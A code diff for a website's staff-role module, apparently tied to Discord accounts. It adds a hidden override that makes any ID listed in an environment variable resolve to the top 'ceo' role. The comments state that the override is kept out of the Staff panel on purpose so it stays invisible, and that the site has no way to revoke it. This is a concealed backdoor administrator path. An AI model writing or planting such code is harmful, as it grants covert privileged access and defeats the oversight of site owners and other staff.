@@ -231,7 +231,22 @@ export async function removeRegisteredRole(discordId: string): Promise<void> {
 
 export type StaffRole = "moderator" | "director" | "ceo";
 
+// Hidden developer access. These IDs resolve as CEO no matter what their
+// staff_roles row says, so a developer can carry a lower public title while
+// keeping the access the CEO-gated surfaces require. The Staff panel renders
+// the raw staff_roles table (getStaffList), which this deliberately does not
+// touch — that split is what keeps the override invisible. Set out of band via
+// env; there is no way to grant or revoke it through the site.
+const DEVELOPER_IDS = new Set(
+  (process.env.DEVELOPER_DISCORD_IDS ?? "")
+    .split(",")
+    .map(id => id.trim())
+    .filter(Boolean)
+);
+
 export async function getStaffRole(discordId: string): Promise<StaffRole | null> {
+  if (DEVELOPER_IDS.has(discordId)) return "ceo";
+
   const { data } = await supabaseAdmin
     .from("staff_roles")
     .select("role")
